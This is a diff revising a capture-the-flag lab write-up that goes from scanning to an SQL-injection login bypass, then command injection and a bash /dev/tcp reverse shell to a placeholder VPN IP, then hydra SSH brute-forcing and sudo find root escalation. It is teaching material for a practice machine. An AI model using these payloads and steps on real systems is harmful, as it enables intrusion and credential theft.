@@ -24,22 +24,22 @@ Allow two to three minutes for all services to start.
 
 ---
 
-# Reconnaissance
+## Reconnaissance
 
-Of course, first thing is scanning 
+Of course, the first thing is scanning 
 `rustscan -a 10.48.142.220 --top -- -sV -sC` 
 
 ![image-1165](/assets/img/obsidian/operation-promotion/image-1165.png)
 
 ![image-1166](/assets/img/obsidian/operation-promotion/image-1166.png)
 
-Ports 22 (SSH), 80 (HTTP), 139 and 445 (SMB) are opened. So let check the website first.
+**Ports 22 (SSH), 80 (HTTP), 139 and 445 (SMB)** are open. So let's check the website first.
 
 ![image-1167](/assets/img/obsidian/operation-promotion/image-1167.png)
 
 ![image-1168](/assets/img/obsidian/operation-promotion/image-1168.png)
 
-Since website doesn't show any feature available. I will use `gobuster` to discover hidden pages.
+Since the website doesn't show any available features, I will use `gobuster` to discover hidden pages.
 
 ```bash
 gobuster dir -u http://10.48.142.220/ \       
@@ -48,51 +48,57 @@ gobuster dir -u http://10.48.142.220/ \
 
 ![image-1170](/assets/img/obsidian/operation-promotion/image-1170.png)
 
-I found `/admin `and `/config` but for config page. We need authorization to access.
+I found `/admin `and `/config`, but for the config page, we need authorization to access it.
 
 ![image-1169](/assets/img/obsidian/operation-promotion/image-1169.png)
 
-For `/admin` page it is sign in pages.
+## Login Bypass
 
-So, maybe let try to use SQL injection. I put `' OR 1=1--` at username and random password.
+The `/admin` page is a sign-in page.
+
+So, maybe let's try to use SQL injection. I put `' OR 1=1--` as the username and a random password.
 
 ![image-1171](/assets/img/obsidian/operation-promotion/image-1171.png)
 
-And it worked! On this dashboard page it have feature to lookup a user by ID
+And it worked! This dashboard page has a feature to look up a user by ID
 
 ![image-1172](/assets/img/obsidian/operation-promotion/image-1172.png)
 ![image-1174](/assets/img/obsidian/operation-promotion/image-1174.png)
 
-And I try to change id parameter to another number and it show something interesting at ID number 7
+And I try to change the id parameter to another number, and it shows something interesting at ID number 7
 
 ![image-1175](/assets/img/obsidian/operation-promotion/image-1175.png)
 
-We discover new path `admin/sysmaint-checks/ping.php`
+We discover a new path `admin/sysmaint-checks/ping.php`
 
 ![image-1176](/assets/img/obsidian/operation-promotion/image-1176.png)
 
-This mean we can ping target via this url.
+## Command Injection
+
+This means we can ping a target via this url.
 
 ![image-1177](/assets/img/obsidian/operation-promotion/image-1177.png)
 
-And I think this look like it vuln to **Command Injection**, so I try put `;` after IP addressed and inject command to it and it really worked.
+And I think this looks like it's vuln to **Command Injection**, so I try putting `;` after the IP address and injecting a command into it, and it really worked.
 
 ![image-1180](/assets/img/obsidian/operation-promotion/image-1180.png)
 
-Then I will inject this command to perform reverse shell
+Then I will inject this command to perform a reverse shell
 `bash -c "bash -i >& /dev/tcp/<YOUR_TRYHACKME_VPN_IP>/4444 0>&1"`
 
-and use `nc -lvnp 4444` to wait for connection.
+and use `nc -lvnp 4444` to wait for a connection.
 
-but we have to encode this command to url format first using cyber chef.
+but we have to encode this command into url format first using cyber chef.
 
 ![image-1181](/assets/img/obsidian/operation-promotion/image-1181.png)
 
-After connected I found config dir that contain db.conf inside this is very important file.
+## SSH Access
+
+After connecting, I found a config directory that contains `db.conf.` This is a very important file.
 
 ![image-1182](/assets/img/obsidian/operation-promotion/image-1182.png)
 
-But we are not able to crack the db_pass_hash. After stucking
+But we are not able to crack the `db_pass_hash`. After getting stuck,
 
 ![image-1168](/assets/img/obsidian/operation-promotion/image-1168.png)
 
@@ -103,7 +109,7 @@ I remember the keyword `spring2026`. Now, we will create our own word lists usin
 ![image-1184](/assets/img/obsidian/operation-promotion/image-1184.png)
 
 
-Then use hydra to bruteforce to ssh.
+Then use `hydra` to **brute-force ssh.**
 
 ![image-1185](/assets/img/obsidian/operation-promotion/image-1185.png)
 
@@ -111,13 +117,17 @@ and we get the password
 
 ![image-1186](/assets/img/obsidian/operation-promotion/image-1186.png)
 
-now connect to jford using this credential and `cat user.txt` to get the flag
+now connect to jford using these credentials and `cat user.txt` to get the flag
 
 ![image-1187](/assets/img/obsidian/operation-promotion/image-1187.png)
+
+## Get Root
 
 and we found 
 
 ![image-1188](/assets/img/obsidian/operation-promotion/image-1188.png)
+
+`sudo -l` shows that `jford` can run `/usr/bin/find` as root without a password. Since `find` can execute another command, this looks useful for getting a root shell.
 
 then I check with `GTFOBins`
 
